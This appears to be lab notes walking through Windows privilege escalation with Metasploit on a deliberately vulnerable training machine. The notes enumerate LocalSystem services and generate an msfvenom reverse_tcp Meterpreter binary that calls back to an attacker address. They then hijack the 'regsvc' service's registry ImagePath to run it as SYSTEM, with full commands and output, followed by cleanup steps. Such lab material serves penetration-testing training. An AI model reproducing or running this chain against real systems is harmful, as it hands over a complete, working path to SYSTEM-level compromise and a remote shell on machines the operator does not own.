# Metasploit

## 01 - Enumerate

```
meterpreter > getuid
Server username: TCM-PC\user
meterpreter > shell
Process 2276 created.
Channel 14 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>wmic service get name, startname, pathname | findstr /i "localsystem" | findstr /i "c:\program files"
wmic service get name, startname, pathname | findstr /i "localsystem" | findstr /i "c:\program files"
AmazonSSMAgent                       "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                         LocalSystem                  
AWSLiteAgent                         C:\Program Files\Amazon\XenTools\LiteAgent.exe                                             LocalSystem                  
daclsvc                              "C:\Program Files\DACL Service\daclservice.exe"                                            LocalSystem                  
dllsvc                               "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"                                 LocalSystem                  
Ec2Config                            "C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"                                   LocalSystem                  
filepermsvc                          "C:\Program Files\File Permissions Service\filepermservice.exe"                            LocalSystem                  
regsvc                               "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"                   LocalSystem                  
unquotedsvc                          C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe                LocalSystem                  
VGAuthService                        "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                     LocalSystem                  
VMTools                              "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                        LocalSystem                  
VMware Physical Disk Helper Service  "C:\Program Files\VMware\VMware Tools\vmacthlp.exe"                                        LocalSystem                  
VMwareCAFCommAmqpListener            "C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"             LocalSystem                  
VMwareCAFManagementAgentHost         "C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"          LocalSystem                  

C:\Users\user>exit
exit
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > service_query regsvc

Name        : regsvc
Display     : Insecure Registry Service
Account     : LocalSystem
Status      : Stopped
Start Type  : Manual
Path        : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
L.O. Group  : 
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;WD)

meterpreter > execute -Hicf icacls -a "\"C:\Program Files\Insecure Registry Service\insecureregistryservice.exe\""
Process 1452 created.
Channel 17 created.
C:\Program Files\Insecure Registry Service\insecureregistryservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                       BUILTIN\Administrators:(I)(F)
                                                                       BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

## 02 - Exploit

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.145.108 lport=53 -f exe-service -o shell-x64.exe
```

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 > handler -p windows/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53 -x
[*] Payload handler running as background job 3.

[*] Started reverse TCP handler on 10.8.145.108:53
```

```
msf6 > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload shell-x64.exe c:\\temp\\
[*] uploading  : /home/user/shell-x64.exe -> c:\temp\
[*] uploaded   : /home/user/shell-x64.exe -> c:\temp\\shell-x64.exe
meterpreter > reg enumkey -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc
Enumerating: HKLM\SYSTEM\CurrentControlSet\services\regsvc

  Keys (1):

        Security

  Values (6):

        Type
        Start
        ErrorControl
        ImagePath
        DisplayName
        ObjectName

meterpreter > reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc -v ImagePath -t REG_EXPAND_SZ -d "C:\temp\shell-x64.exe"
Successfully set ImagePath of REG_EXPAND_SZ.
meterpreter > reg queryval -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc -v ImagePath
Key: HKLM\SYSTEM\CurrentControlSet\services\regsvc
Name: ImagePath
Type: REG_EXPAND_SZ
Data: C:\temp\shell-x64.exe
meterpreter > service_control regsvc restart

[*] Sending stage (200774 bytes) to 10.10.1.151
[+] Operation restart succeeded.
[*] Meterpreter session 6 opened (10.8.145.108:53 -> 10.10.1.151:49262) at 2022-05-27 13:52:16 -0400

meterpreter > sessions 6
[*] Backgrounding session 1...
[*] Starting interaction with 6...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 03 - Cleanup

```
meterpreter > reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc -v ImagePath -t REG_EXPAND_SZ -d "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
meterpreter > reg queryval -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc -v ImagePath
Key: HKLM\SYSTEM\CurrentControlSet\services\regsvc
Name: ImagePath
Type: REG_EXPAND_SZ
Data: C:\Program Files\Insecure Registry Service\insecureregistryservice.exe
meterpreter > rm C:\\temp\\shell-x64.exe
```